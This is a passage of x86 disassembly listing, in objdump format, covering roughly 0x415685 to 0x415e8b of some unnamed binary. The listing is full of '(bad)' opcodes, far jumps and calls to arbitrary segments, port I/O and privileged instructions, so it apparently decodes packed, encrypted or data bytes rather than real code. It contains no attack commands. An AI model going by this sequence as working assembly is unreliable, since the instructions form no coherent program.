  415685:	mov    bh,BYTE PTR [ecx-0x55]
  415688:	fs js  0x415661
  41568b:	adc    bl,BYTE PTR [edx+0x36eb3b3a]
  415691:	cmp    al,0xde
  415693:	mov    edx,0x4df9a7fd
  415698:	jmp    0x795e960e
  41569d:	dec    esp
  41569e:	cmp    DWORD PTR [edx],edx
  4156a0:	dec    esi
  4156a1:	dec    esp
  4156a2:	xor    BYTE PTR [ebp+0x39ca396e],cl
  4156a8:	add    BYTE PTR [esi+edi*1+0xa455b4d],0xd4
  4156b0:	aam    0x74
  4156b2:	jge    0x415684
  4156b4:	int3   
  4156b5:	pop    esi
  4156b6:	lea    edx,[ebp+ecx*8-0x34]
  4156ba:	(bad)  
  4156bb:	adc    eax,DWORD PTR [eax]
  4156bd:	(bad)  
  4156be:	mov    eax,0xeb9bf6ca
  4156c3:	fild   DWORD PTR [ebx-0x351a042f]
  4156c9:	cmp    DWORD PTR [esi-0x79],eax
  4156cc:	and    dh,bh
  4156ce:	xchg   edx,eax
  4156cf:	out    dx,al
  4156d0:	inc    ebx
  4156d1:	pop    eax
  4156d2:	rcl    DWORD PTR [ecx+0x2c],cl
  4156d5:	xchg   esi,eax
  4156d6:	push   edx
  4156d7:	ret    0x9ca6
  4156da:	inc    ebx
  4156db:	jne    0x41575b
  4156dd:	fsub   st(1),st
  4156df:	add    BYTE PTR [edi-0x25],0xbc
  4156e3:	and    dh,BYTE PTR [ebx+0x5917ff2d]
  4156e9:	cmp    DWORD PTR [ebx-0x36],edx
  4156ec:	push   edi
  4156ed:	pushf  
  4156ee:	dec    ebp
  4156ef:	or     bh,BYTE PTR ds:0x5282f57c
  4156f5:	ret    0x6b1c
  4156f8:	sahf   
  4156f9:	outs   dx,DWORD PTR ds:[esi]
  4156fa:	inc    edx
  4156fb:	nop
  4156fc:	xchg   BYTE PTR [edi],bh
  4156fe:	xor    esp,DWORD PTR [ecx]
  415700:	retf   
  415701:	mov    eax,ds:0x9ed4c82c
  415706:	aad    0xae
  415708:	mov    gs,edx
  41570a:	int3   
  41570b:	popf   
  41570c:	sbb    eax,0xca886fa4
  415711:	push   ebp
  415712:	ret    
  415713:	fist   WORD PTR [ecx+0x75f638e9]
  415719:	mov    ebp,0xfbf0c78b
  41571e:	cli    
  41571f:	aad    0x83
  415721:	ss push cs
  415723:	pop    ds
  415724:	bnd jmp 0x96795a1d
  41572a:	sbb    al,0x8f
  41572c:	(bad)  
  41572d:	(bad)
  415730:	add    eax,0xf67df412
  415735:	push   ss
  415736:	rol    BYTE PTR [edx-0x4e51f584],cl
  41573c:	out    0x40,eax
  41573e:	jp     0x41572e
  415740:	fs addr16 ds or al,al
  415745:	es mov eax,0x3a40ba06
  41574b:	pop    esp
  41574c:	arpl   WORD PTR [eax-0x28e33280],sp
  415752:	jne    0x415709
  415754:	pop    esi
  415755:	xchg   edi,eax
  415756:	xor    esi,ebx
  415758:	mov    ch,0xc6
  41575a:	sti    
  41575b:	std    
  41575c:	or     eax,0x6b9155a2
  415761:	sub    BYTE PTR [ecx+0x45388b5b],0xe5
  415768:	push   es
  415769:	fsub   st(3),st
  41576b:	out    0x66,al
  41576d:	push   esi
  41576e:	pop    edi
  41576f:	add    bl,ah
  415771:	mov    dh,0xb
  415773:	fcomi  st,st(7)
  415775:	xor    dl,BYTE PTR [esi]
  415777:	loop   0x41577e
  415779:	ja     0x415727
  41577b:	add    ebp,esi
  41577d:	and    cl,BYTE PTR [eax-0x230cdfd7]
  415783:	inc    ebp
  415784:	pusha  
  415785:	int3   
  415786:	imul   ecx,DWORD PTR [ecx+ecx*4-0x42a6a32d],0x3a492dd8
  415791:	stos   BYTE PTR es:[edi],al
  415792:	cdq    
  415793:	repz cwde 
  415795:	dec    edx
  415796:	repnz (bad) [edx-0x6e6bd0de]
  41579d:	in     eax,0xcd
  41579f:	call   0x22152a6b
  4157a4:	mov    esi,0x705cf640
  4157a9:	hlt    
  4157aa:	enter  0x8b6,0x84
  4157ae:	sub    DWORD PTR [esi+0x6b735999],0x8abc952d
  4157b8:	inc    esp
  4157b9:	pop    esi
  4157ba:	mov    cl,0xac
  4157bc:	je     0x41578b
  4157be:	loop   0x4157f1
  4157c0:	or     DWORD PTR ds:0xf61fda7b,ebp
  4157c6:	and    ch,BYTE PTR [esi]
  4157c8:	or     DWORD PTR [edx+0x35367047],ecx
  4157ce:	adc    BYTE PTR [edi+0x581dd808],ch
  4157d4:	mov    ds:0x16a2e8d7,al
  4157d9:	mul    BYTE PTR [edi+ebx*4+0x62]
  4157dd:	xchg   ebx,eax
  4157de:	fdivr  st,st(3)
  4157e0:	xlat   BYTE PTR ds:[ebx]
  4157e1:	jge    0x4157c4
  4157e3:	out    dx,al
  4157e4:	jns    0x415864
  4157e6:	shl    BYTE PTR [esi-0x4e],cl
  4157e9:	mov    eax,0x6138db2d
  4157ee:	and    cl,BYTE PTR [esi]
  4157f0:	fcomp  QWORD PTR [edx+0x70]
  4157f3:	mov    ebp,0xd25212d
  4157f8:	pop    ecx
  4157f9:	adc    al,0xca
  4157fb:	or     al,0x4b
  4157fd:	or     BYTE PTR [edi+0x15c095ec],ch
  415803:	xchg   ebx,eax
  415804:	fmul   DWORD PTR [esi]
  415806:	jge    0x415794
  415808:	ins    BYTE PTR es:[edi],dx
  415809:	(bad)  
  41580b:	in     eax,0xb7
  41580d:	xlat   BYTE PTR ds:[ebx]
  41580e:	ror    ebp,cl
  415810:	mov    eax,ds:0xc7189f6b
  415815:	fwait
  415816:	adc    bl,BYTE PTR cs:[ebx+0x29]
  41581a:	out    0xdc,eax
  41581c:	cmc    
  41581d:	add    eax,0x23a7211a
  415822:	aad    0x1d
  415824:	mov    BYTE PTR [ebp-0x1b],ch
  415827:	sbb    ecx,eax
  415829:	jb     0x415854
  41582b:	cli    
  41582c:	stos   BYTE PTR es:[edi],al
  41582d:	xor    DWORD PTR [esi+esi*2-0x56],ebp
  415831:	jnp    0x415838
  415833:	mov    ebp,0xb06cf579
  415838:	mov    dl,0x3e
  41583a:	mov    dl,BYTE PTR ds:0xa6638fec
  415840:	pop    ss
  415841:	and    DWORD PTR [ebp-0x39369437],esi
  415847:	sub    ah,BYTE PTR [esi-0x4a]
  41584a:	mov    DWORD PTR [ebp-0x34],0x13fb6dad
  415851:	(bad)  
  415852:	leave  
  415853:	cli    
  415854:	mov    ebp,0x2b6c939a
  415859:	test   al,0xc2
  41585b:	popf   
  41585c:	mov    es,WORD PTR [ecx]
  41585e:	js     0x415881
  415860:	dec    DWORD PTR [ebp-0x73c51245]
  415866:	pop    esi
  415867:	repz push esi
  415869:	rcr    BYTE PTR [edi+0x66],0x69
  41586d:	fild   WORD PTR [ecx+eiz*4+0xbd96f72]
  415874:	jo     0x415854
  415876:	test   BYTE PTR [edi+0x2723f831],al
  41587c:	adc    eax,0x8a1a0c89
  415881:	cmp    ch,BYTE PTR [edi]
  415883:	push   esi
  415884:	lahf   
  415885:	call   0xbbbb:0x31402aaa
  41588c:	mov    dl,0x3a
  41588e:	ret    0x12c8
  415891:	jbe    0x415843
  415893:	or     al,0xd6
  415895:	stos   DWORD PTR es:[edi],eax
  415896:	outs   dx,DWORD PTR ds:[esi]
  415897:	in     eax,dx
  415898:	sar    BYTE PTR [edx],cl
  41589a:	fldenv [ebp-0xe]
  41589d:	sbb    esi,esp
  41589f:	fnstenv [ecx+0x5d]
  4158a2:	aas    
  4158a3:	sbb    BYTE PTR [ecx*1+0x7ee046a5],cl
  4158aa:	and    al,0xd9
  4158ac:	xchg   DWORD PTR [edx],ebx
  4158ae:	into   
  4158af:	adc    eax,0x6b45efe8
  4158b4:	fnsave [eax+0x5462a6c3]
  4158ba:	xchg   edi,eax
  4158bb:	leave  
  4158bc:	sahf   
  4158bd:	fisubr DWORD PTR [edx+0x5]
  4158c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158c1:	lods   al,BYTE PTR ds:[esi]
  4158c2:	(bad)  
  4158c3:	loope  0x4158c9
  4158c5:	adc    ecx,0x15
  4158c8:	es retf 
  4158ca:	or     ebx,DWORD PTR [edx+0x6a]
  4158cd:	jle    0x4158e8
  4158cf:	pusha  
  4158d0:	lds    eax,FWORD PTR [ebx+0x34]
  4158d3:	inc    edx
  4158d4:	push   0x5665e338
  4158d9:	push   esi
  4158da:	mov    ah,0x88
  4158dc:	stos   DWORD PTR es:[edi],eax
  4158dd:	popf   
  4158de:	mov    ebx,edi
  4158e0:	mov    al,0x3c
  4158e2:	xor    eax,0x6178090e
  4158e7:	add    BYTE PTR [edx+0x7c],dh
  4158ea:	inc    ebx
  4158eb:	push   esp
  4158ec:	jbe    0x415961
  4158ee:	test   BYTE PTR [eax],al
  4158f0:	cld    
  4158f1:	jns    0x41594c
  4158f3:	fucom  st(4)
  4158f5:	sar    BYTE PTR [ebx-0x58d26b78],1
  4158fb:	add    DWORD PTR [eax+ebx*8+0x32],edx
  4158ff:	add    dh,BYTE PTR [ebx]
  415901:	sub    eax,0x39cd2061
  415906:	mov    al,ds:0x6cdb1a
  41590b:	(bad)  
  41590c:	mov    bh,0x69
  41590e:	inc    ecx
  41590f:	push   edx
  415910:	add    DWORD PTR [esi-0x6fe631af],ecx
  415916:	mov    ebx,0xe3ef6507
  41591b:	add    eax,0xfccbac29
  415920:	push   esp
  415921:	add    dl,BYTE PTR [esi]
  415923:	pop    ecx
  415924:	mov    eax,edx
  415926:	inc    ebx
  415927:	jp     0x4159a3
  415929:	nop
  41592a:	jp     0x4158c3
  41592c:	add    eax,0x8a67b793
  415931:	pushf  
  415932:	jecxz  0x41592e
  415934:	fwait
  415935:	mov    bl,BYTE PTR [ecx-0x13d297cc]
  41593b:	je     0x4158c1
  41593d:	push   es
  41593e:	dec    edx
  41593f:	ins    DWORD PTR es:[edi],dx
  415940:	retf   0xedc8
  415943:	jb     0x415905
  415945:	push   esp
  415946:	cdq    
  415947:	and    DWORD PTR es:[ecx-0x53],edx
  41594b:	fldenv [ecx+0x2a]
  41594e:	push   cs
  41594f:	bound  edx,QWORD PTR [edi+ecx*1]
  415952:	jae    0x415949
  415954:	dec    edi
  415955:	mov    eax,0xf0678b83
  41595a:	pushf  
  41595b:	inc    esi
  41595c:	mov    ecx,DWORD PTR [edx-0x5ca17b55]
  415962:	or     bl,bl
  415964:	repnz in al,dx
  415966:	mov    dl,0x62
  415968:	xacquire xchg DWORD PTR [edi+0xb],ebx
  41596c:	xchg   BYTE PTR [esp+edx*1+0x3d],dh
  415970:	ja     0x415962
  415972:	jecxz  0x41593b
  415974:	mov    ecx,0xeeb25e51
  415979:	mov    bl,0xcf
  41597b:	stc    
  41597c:	jecxz  0x415962
  41597e:	mov    cs,WORD PTR [edx+0x1035f5b2]
  415984:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415985:	xor    esi,DWORD PTR [ebp-0x8]
  415988:	xchg   ebx,eax
  415989:	(bad)  
  41598a:	xor    ebp,edx
  41598c:	cld    
  41598d:	and    al,0x9e
  41598f:	loopne 0x415a01
  415991:	lods   al,BYTE PTR ds:[esi]
  415992:	std    
  415993:	mov    dh,ch
  415995:	test   BYTE PTR [ebx-0x4a7f673c],cl
  41599b:	pop    esp
  41599c:	inc    ecx
  41599d:	(bad)  
  41599f:	cmp    dl,BYTE PTR [edi+edi*2-0x3736f9c8]
  4159a6:	cwde   
  4159a7:	mov    bl,0xbc
  4159a9:	shl    DWORD PTR [ebx+edx*8+0x47],1
  4159ad:	(bad)  
  4159ae:	pop    ebp
  4159af:	add    dh,0xdf
  4159b2:	mov    edi,0xdb4389e0
  4159b7:	fisttp QWORD PTR [esi]
  4159b9:	mov    ds:0x9fd0bc4f,eax
  4159be:	lods   al,BYTE PTR ds:[esi]
  4159bf:	int3   
  4159c0:	add    bl,bl
  4159c2:	mov    esp,0xe734a4b2
  4159c7:	pop    ecx
  4159c8:	and    DWORD PTR [eax+0x28],edx
  4159cb:	test   DWORD PTR [ebp+0x50],eax
  4159ce:	retf   
  4159cf:	shl    DWORD PTR [edx-0x788dd121],cl
  4159d5:	or     al,0x51
  4159d7:	push   0x926a15ef
  4159dc:	loop   0x4159c3
  4159de:	adc    DWORD PTR [ecx+0x386fe45a],0x49eea5bc
  4159e8:	hlt    
  4159e9:	inc    ebp
  4159ea:	add    edi,DWORD PTR [esi+ecx*2+0x7f]
  4159ee:	jl     0x4159aa
  4159f0:	adc    bh,dl
  4159f2:	out    dx,al
  4159f3:	cmc    
  4159f4:	out    dx,eax
  4159f5:	add    BYTE PTR [ebp-0x26],cl
  4159f8:	pusha  
  4159f9:	pusha  
  4159fa:	imul   cl
  4159fc:	cli    
  4159fd:	push   ebx
  4159fe:	inc    ebx
  4159ff:	rcl    WORD PTR [ecx-0x69],0x3e
  415a04:	dec    ah
  415a06:	outs   dx,DWORD PTR ds:[esi]
  415a07:	retf   
  415a08:	sub    DWORD PTR [edx+0x60dd0fdd],ecx
  415a0e:	clc    
  415a0f:	fwait
  415a10:	stos   BYTE PTR es:[edi],al
  415a11:	loope  0x4159d0
  415a13:	inc    esp
  415a14:	pop    ecx
  415a15:	push   ebp
  415a16:	dec    edi
  415a17:	sub    BYTE PTR [ebp-0x239814f6],bh
  415a1d:	ss jno 0x415a24
  415a20:	pop    esp
  415a21:	mov    WORD PTR [ebx-0x22],ds
  415a24:	sbb    ecx,DWORD PTR [ebx+0x20]
  415a27:	ja     0x415a7a
  415a29:	ins    BYTE PTR es:[edi],dx
  415a2a:	lods   al,BYTE PTR ds:[esi]
  415a2b:	sub    esi,DWORD PTR [eax-0x7253bc8f]
  415a31:	jno    0x4159c3
  415a33:	sbb    BYTE PTR [edx-0x49bd0e19],cl
  415a39:	sbb    bh,cl
  415a3b:	jno    0x415a7c
  415a3d:	in     eax,dx
  415a3e:	dec    edx
  415a3f:	arpl   WORD PTR [ecx],si
  415a41:	dec    eax
  415a42:	imul   ecx,DWORD PTR [ebx],0x6d658e33
  415a48:	sub    BYTE PTR [ebx],dl
  415a4a:	inc    edx
  415a4c:	les    edi,FWORD PTR [esi+0x4b7d28c1]
  415a52:	pop    ebp
  415a53:	xchg   DWORD PTR [esi],eax
  415a55:	push   edi
  415a56:	mov    WORD PTR [esi-0x62],ds
  415a59:	adc    ah,BYTE PTR [esi-0x38]
  415a5c:	out    dx,eax
  415a5d:	sub    edx,ecx
  415a5f:	sub    edi,0x2263c15
  415a65:	sub    al,0x50
  415a67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a68:	sub    eax,0xfe67f625
  415a6d:	dec    ecx
  415a6e:	and    DWORD PTR [edx+0x5d55553a],esp
  415a74:	lock in eax,dx
  415a76:	push   ss
  415a77:	rcl    ah,0x28
  415a7a:	lock sub DWORD PTR [eax-0x3e68ed67],edx
  415a81:	shr    al,1
  415a83:	ror    DWORD PTR [edi+0x74b41efa],1
  415a89:	mov    ds:0x493d4042,al
  415a8e:	jmp    0x8f4d6394
  415a93:	test   ebp,ebp
  415a95:	sbb    al,0x66
  415a97:	dec    DWORD PTR [esi+ebp*2]
  415a9a:	or     esp,esi
  415a9c:	les    ebx,FWORD PTR [eax-0x180b641b]
  415aa2:	pop    ecx
  415aa3:	mov    edi,0xe4505620
  415aa8:	aad    0x5b
  415aaa:	pop    edx
  415aab:	and    eax,0xc9bb441b
  415ab0:	lods   eax,DWORD PTR ds:[esi]
  415ab1:	xor    bl,dl
  415ab3:	pop    es
  415ab4:	mov    dl,0xf0
  415ab6:	les    esi,FWORD PTR [ebx-0x7]
  415ab9:	loop   0x415b0b
  415abb:	adc    DWORD PTR [ebx],esp
  415abd:	fistp  DWORD PTR [edx+0x7d0bb7fd]
  415ac3:	mov    bh,0xe8
  415ac5:	inc    edx
  415ac6:	jbe    0x415ae8
  415ac8:	xor    al,0xb2
  415aca:	outs   dx,BYTE PTR ds:[esi]
  415acb:	enter  0x4342,0x9f
  415acf:	mov    ebp,0xbace80cd
  415ad4:	cdq    
  415ad5:	retf   0x9f4
  415ad8:	fldenv [esi-0x37500d8]
  415ade:	and    BYTE PTR [edx-0x343d664d],dl
  415ae4:	sub    DWORD PTR [ebx-0xdf5ba85],ebp
  415aea:	(bad)  
  415aeb:	or     dh,BYTE PTR [ebp-0x4d]
  415aee:	sbb    ebx,DWORD PTR [ebp+0x6378a44e]
  415af4:	(bad)  
  415af5:	loope  0x415adc
  415af7:	xchg   ebx,eax
  415af8:	sub    al,0xcb
  415afa:	test   al,0x96
  415afd:	pop    esp
  415afe:	ja     0x415aea
  415b00:	cmp    cl,ch
  415b02:	imul   esi,DWORD PTR [ecx-0x22],0x71
  415b06:	xchg   edi,eax
  415b07:	push   0xffffffe2
  415b09:	inc    edi
  415b0a:	fwait
  415b0b:	pop    ecx
  415b0c:	in     al,0x68
  415b0e:	pop    esi
  415b0f:	dec    edi
  415b10:	dec    esp
  415b11:	out    0x43,al
  415b13:	bound  eax,QWORD PTR ds:0x95ab0564
  415b19:	stos   DWORD PTR es:[edi],eax
  415b1a:	inc    edx
  415b1b:	shl    DWORD PTR [eax],0x91
  415b1e:	jecxz  0x415b9f
  415b20:	xlat   BYTE PTR ds:[ebx]
  415b21:	lods   al,BYTE PTR ds:[esi]
  415b22:	inc    ebx
  415b23:	and    eax,0x807d4df7
  415b28:	test   al,0xac
  415b2a:	jl     0x415b16
  415b2c:	and    esp,DWORD PTR [eax+0x1d]
  415b2f:	stc    
  415b30:	sbb    DWORD PTR [ecx-0x6a],0x83bda29e
  415b37:	repz push ebp
  415b39:	xlat   BYTE PTR ds:[ebx]
  415b3a:	sti    
  415b3b:	inc    edi
  415b3c:	std    
  415b3d:	dec    ebp
  415b3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b3f:	dec    ebx
  415b40:	mov    DWORD PTR [esi+0x4e],esi
  415b43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b44:	int    0x3f
  415b46:	ss push 0x7
  415b49:	pop    ebx
  415b4a:	aad    0x94
  415b4c:	pushf  
  415b4d:	call   0xe9ce:0x46d0749f
  415b54:	hlt    
  415b55:	add    dh,BYTE PTR [ebx-0x15af103c]
  415b5b:	ja     0x415b6d
  415b5d:	jmp    0x415b45
  415b5f:	mov    cl,bh
  415b61:	fidivr WORD PTR [ebx+0x637708ba]
  415b67:	cdq    
  415b68:	fs xchg esi,eax
  415b6a:	in     eax,dx
  415b6b:	xchg   ebx,eax
  415b6c:	imul   esi,DWORD PTR [ecx-0x60],0x9f62a460
  415b73:	cld    
  415b74:	inc    ebp
  415b75:	xchg   esi,eax
  415b76:	xchg   esi,eax
  415b77:	sub    BYTE PTR [edi-0x24],ch
  415b7a:	cmp    BYTE PTR [eax+esi*8+0x2b],ah
  415b7e:	popf   
  415b7f:	cmp    eax,0x32057692
  415b84:	in     eax,0x44
  415b86:	test   eax,0x297994b
  415b8b:	dec    ebx
  415b8c:	es mov ah,0xd0
  415b8f:	aas    
  415b90:	popf   
  415b91:	xchg   BYTE PTR [esi+ecx*1],bh
  415b94:	and    dl,bh
  415b96:	lods   al,BYTE PTR ds:[esi]
  415b97:	jecxz  0x415b9e
  415b99:	xchg   esp,eax
  415b9a:	xchg   esp,eax
  415b9b:	loop   0x415b23
  415b9d:	mov    dl,0xfd
  415b9f:	and    al,0xd6
  415ba1:	(bad)  
  415ba3:	pop    ebp
  415ba4:	xchg   edx,eax
  415ba5:	mov    ebp,0xe24ba2c0
  415baa:	daa    
  415bab:	add    DWORD PTR [eax+0x73c34569],ebx
  415bb1:	push   esp
  415bb2:	out    0x31,eax
  415bb4:	ins    BYTE PTR es:[edi],dx
  415bb5:	and    ah,BYTE PTR [edi+eax*8]
  415bb8:	es jmp 0x2901:0xff9a3213
  415bc0:	jp     0x415bc5
  415bc2:	jmp    0xfe7709ed
  415bc7:	ficom  WORD PTR [edi+0x44]
  415bca:	sahf   
  415bcb:	mov    edx,0xce3b0703
  415bd0:	(bad)  
  415bd1:	call   0xec6830e8
  415bd6:	or     ecx,ebp
  415bd8:	scas   eax,DWORD PTR es:[edi]
  415bd9:	ret    
  415bda:	mov    bh,0xc5
  415bdc:	adc    al,0x20
  415bde:	mov    ?,esi
  415be0:	aas    
  415be1:	lahf   
  415be2:	in     al,0x20
  415be4:	pushf  
  415be5:	retf   
  415be6:	adc    DWORD PTR [eax+0x4],ebp
  415be9:	call   0x90a4:0xc5cc89eb
  415bf0:	sub    DWORD PTR [esi+eax*4-0x6b389ca2],edx
  415bf7:	repz lahf 
  415bf9:	rol    BYTE PTR [ebp+0x62570b06],0xb6
  415c00:	push   ss
  415c01:	dec    ebx
  415c02:	mov    ecx,0x676c48c7
  415c07:	leave  
  415c08:	out    dx,eax
  415c09:	in     eax,dx
  415c0a:	xchg   ebx,eax
  415c0b:	mov    DWORD PTR [edx-0x5f],edx
  415c0e:	mov    ds:0x633a98d1,eax
  415c13:	clc    
  415c14:	int3   
  415c15:	xchg   edx,eax
  415c16:	imul   ebx,DWORD PTR [esi+0x46b5a92a],0x5ea9cb71
  415c20:	mov    DWORD PTR [ebx+eax*2+0x6e],0xcc3517e1
  415c28:	aad    0xfe
  415c2a:	sahf   
  415c2b:	int    0xcb
  415c2d:	into   
  415c2e:	push   esp
  415c2f:	leave  
  415c30:	jp     0x415c67
  415c32:	js     0x415bbf
  415c34:	daa    
  415c35:	push   ebx
  415c36:	add    cl,ah
  415c38:	mov    cl,0x91
  415c3a:	stc    
  415c3b:	in     al,0xe6
  415c3d:	hlt    
  415c3e:	lods   eax,DWORD PTR ds:[esi]
  415c3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c40:	fdivp  st(4),st
  415c42:	dec    eax
  415c43:	fcom   DWORD PTR [ecx-0x7b1ff100]
  415c49:	inc    ebx
  415c4a:	jb     0x415c47
  415c4c:	add    DWORD PTR [edx+esi*8+0x74b60dd9],edi
  415c53:	mov    ah,0xe8
  415c55:	aaa    
  415c56:	cli    
  415c57:	mov    BYTE PTR [edx-0x5fe071e7],dh
  415c5d:	push   eax
  415c5e:	push   ebp
  415c5f:	jl     0x415bf8
  415c61:	adc    esp,edx
  415c63:	or     eax,0xcbc43e2b
  415c68:	(bad)  
  415c69:	sub    BYTE PTR [edi],ah
  415c6b:	push   0xffffffdb
  415c6d:	push   eax
  415c6e:	jge    0x415cec
  415c70:	das    
  415c71:	dec    esp
  415c72:	out    0xc4,eax
  415c74:	shl    DWORD PTR [esi+0x56ddabdc],1
  415c7a:	mov    edi,0x1f478eaf
  415c7f:	inc    esp
  415c80:	es daa 
  415c82:	cmp    edi,esp
  415c84:	adc    DWORD PTR [edx],ebx
  415c86:	lods   eax,DWORD PTR ds:[esi]
  415c87:	pop    es
  415c88:	clc    
  415c89:	add    DWORD PTR [edx],ebx
  415c8b:	xchg   ebp,eax
  415c8c:	pop    edx
  415c8d:	xchg   DWORD PTR [ecx+ecx*2-0xb8e803],ebx
  415c94:	and    ch,BYTE PTR [edx-0x15]
  415c97:	fdivrp st(7),st
  415c99:	sub    cl,BYTE PTR [ebp-0x1b]
  415c9c:	(bad)  
  415c9d:	cwde   
  415c9e:	or     bl,ah
  415ca0:	mov    esp,0xe354557a
  415ca5:	mov    al,0xa8
  415ca7:	mov    al,ds:0x76e68ea5
  415cac:	daa    
  415cad:	stc    
  415cae:	mov    ebp,0xeaf0f78b
  415cb3:	sbb    BYTE PTR [edx-0x1d],bh
  415cb6:	out    dx,eax
  415cb7:	xor    al,0x2b
  415cb9:	jmp    0x898f:0xf2c25d67
  415cc0:	inc    ebx
  415cc1:	test   BYTE PTR [esi-0x12],dl
  415cc4:	adc    DWORD PTR [edx+0x4e0c89ac],esp
  415cca:	lock (bad) 
  415ccc:	scas   al,BYTE PTR es:[edi]
  415ccd:	adc    BYTE PTR [edi-0x65],dh
  415cd0:	mov    edi,0x1491f019
  415cd5:	mov    ch,0xbe
  415cd7:	data16 jne 0x415cc7
  415cda:	aad    0x0
  415cdc:	add    DWORD PTR [edx+0x52a8809f],0x77a4efed
  415ce6:	mov    edx,0x3677ce23
  415ceb:	jb     0x415d26
  415ced:	hlt    
  415cee:	sbb    esp,DWORD PTR [ebx]
  415cf0:	ja     0x415c9f
  415cf2:	push   ss
  415cf3:	lods   al,BYTE PTR ds:[esi]
  415cf4:	dec    ecx
  415cf5:	stos   DWORD PTR es:[edi],eax
  415cf6:	sub    edi,ecx
  415cf8:	into   
  415cf9:	jmp    0x415d57
  415cfb:	push   ebx
  415cfc:	ss push ds
  415cfe:	jge    0x415d53
  415d00:	mov    al,ds:0x884211c3
  415d05:	in     eax,dx
  415d06:	cs jg  0x415d7f
  415d09:	(bad)  
  415d0a:	rol    esi,1
  415d0c:	cld    
  415d0d:	xor    ecx,DWORD PTR [edi+0x1cc7f378]
  415d13:	adc    BYTE PTR [edi],dh
  415d15:	sub    BYTE PTR [edi+esi*2+0x3e],dl
  415d19:	xchg   ebp,eax
  415d1a:	or     al,0x5c
  415d1c:	fsub   QWORD PTR [eax-0x5908be65]
  415d22:	lock push ecx
  415d24:	pop    edi
  415d25:	loope  0x415d1e
  415d27:	fsubr  st(0),st
  415d29:	mov    ebx,0xecd7a780
  415d2e:	(bad)  [esi]
  415d30:	cmp    DWORD PTR [ecx-0x1e],ebp
  415d33:	enter  0x83fb,0xeb
  415d37:	test   eax,0x4a1050f8
  415d3c:	mov    bh,BYTE PTR [edx-0x4599bf20]
  415d42:	push   esi
  415d43:	mov    al,0xfb
  415d45:	sbb    al,0xb9
  415d47:	cwde   
  415d48:	ja     0x415d48
  415d4a:	or     ecx,edi
  415d4c:	and    BYTE PTR [edx+eiz*2-0x3f320d07],dh
  415d53:	js     0x415d06
  415d55:	or     eax,0x9171a628
  415d5a:	sar    al,1
  415d5c:	cmp    ch,BYTE PTR [eax]
  415d5e:	ds lahf 
  415d60:	xchg   dh,dh
  415d62:	xor    al,0x57
  415d64:	in     eax,0x6f
  415d66:	fdiv   QWORD PTR [ecx+edx*4+0x43d4f7d1]
  415d6d:	mov    al,0x87
  415d6f:	jb     0x415cf2
  415d71:	cld    
  415d72:	leave  
  415d73:	sub    dh,al
  415d75:	xlat   BYTE PTR ds:[ebx]
  415d76:	add    eax,0x67e44a86
  415d7b:	and    DWORD PTR cs:[eax],ebx
  415d7e:	ret    
  415d7f:	or     ah,BYTE PTR [edi]
  415d81:	xchg   ecx,eax
  415d82:	call   0x9e79:0xdf074079
  415d89:	enter  0x2436,0x54
  415d8d:	mov    ebp,gs
  415d8f:	stos   DWORD PTR es:[edi],eax
  415d90:	push   0x74836e44
  415d95:	add    BYTE PTR [ebx+ecx*8-0x1],dh
  415d99:	adc    eax,0xab61a018
  415d9e:	nop
  415d9f:	jbe    0x415deb
  415da1:	dec    ecx
  415da2:	mov    BYTE PTR [ebx],ah
  415da4:	inc    eax
  415da5:	mov    eax,ds
  415da7:	aaa    
  415da8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415da9:	jecxz  0x415db5
  415dab:	xchg   esp,eax
  415dac:	retf   
  415dad:	or     esi,DWORD PTR [esi-0x28]
  415db0:	and    dl,bh
  415db2:	repz xor eax,0x768000b3
  415db8:	dec    esp
  415db9:	cmp    DWORD PTR [ebx-0x481222e7],0xffffff9b
  415dc0:	cmp    al,0xc2
  415dc2:	jmp    0xfa2e:0x4d6be714
  415dc9:	add    al,0x82
  415dcb:	mov    ecx,0x3597cbc3
  415dd0:	xchg   edi,eax
  415dd1:	jg     0x415da6
  415dd3:	out    dx,eax
  415dd4:	mov    eax,gs:0xe086f5fc
  415dda:	mov    esp,0xff0e2083
  415ddf:	mov    bl,0x96
  415de1:	test   ebx,esi
  415de3:	push   ebp
  415de4:	fld    TBYTE PTR [ecx+0x3389e5a4]
  415dea:	inc    ecx
  415deb:	push   ebx
  415dec:	jo     0x415d96
  415dee:	cmp    dh,ch
  415df0:	mov    ch,0x6f
  415df2:	ret    0xfb4e
  415df5:	inc    edi
  415df6:	or     edi,edi
  415df8:	hlt    
  415df9:	dec    ecx
  415dfa:	test   BYTE PTR [ebp+eax*2-0x24977944],0x82
  415e02:	test   eax,0x95045ef0
  415e07:	pusha  
  415e08:	or     dh,al
  415e0a:	shr    ah,1
  415e0c:	pop    ecx
  415e0d:	add    DWORD PTR ds:0x8f09b75d,eax
  415e13:	(bad)  
  415e14:	aam    0x8d
  415e16:	jp     0x415db4
  415e18:	test   DWORD PTR [ebp-0x1e4daaf],0x75473e94
  415e22:	add    cl,BYTE PTR ds:[edi-0x2da55b12]
  415e29:	imul   esi,eax,0x3a
  415e2c:	repz mov ah,0xd5
  415e2f:	stos   BYTE PTR es:[edi],al
  415e30:	and    al,0x8f
  415e32:	mov    eax,ds:0xd96e6a36
  415e37:	xor    DWORD PTR [eax-0x5d877b5d],ebp
  415e3d:	(bad)  
  415e3e:	shl    DWORD PTR [eax+0x10],cl
  415e41:	xchg   ebp,eax
  415e42:	add    BYTE PTR [ebx],dh
  415e44:	and    dh,bl
  415e46:	inc    esi
  415e47:	and    eax,0x2b174024
  415e4c:	fcom   DWORD PTR ds:0x2e86608b
  415e52:	xchg   BYTE PTR [ebx+0x61d4b60a],ch
  415e58:	add    eax,0xb02379c8
  415e5d:	and    BYTE PTR [ebx],ch
  415e5f:	xchg   edi,eax
  415e61:	rcr    DWORD PTR [eax-0x4f640c73],1
  415e67:	jl     0x415ded
  415e69:	lea    ecx,[esi+0x69f7d73f]
  415e6f:	cmp    bh,BYTE PTR [ecx-0x54c59482]
  415e75:	sub    DWORD PTR [edx-0x7],ecx
  415e78:	imul   eax,DWORD PTR [ebp+0x3a2fcbe6],0xffffffca
  415e7f:	mov    gs,WORD PTR [eax-0x768c6f6c]
  415e85:	shl    BYTE PTR [edi-0x44e3f48d],1
  415e8b:	dec    ebp
